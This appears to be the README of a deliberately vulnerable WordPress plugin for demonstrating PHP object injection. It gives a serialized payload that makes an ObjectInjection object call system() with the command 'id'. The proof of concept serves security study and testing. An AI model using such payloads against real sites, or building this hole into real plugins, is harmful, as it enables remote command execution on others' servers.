# WP Object Injection Proof of Concept
This is a simple plugin to make PoC of PHP Object Injection in Wordpress.

## Payload
```
echo serialize(new ObjectInjection("system","id"));
O:15:"ObjectInjection":2:{s:20:"ObjectInjectioncmd";s:2:"id";s:20:"ObjectInjectionfcn";s:6:"system";}
```
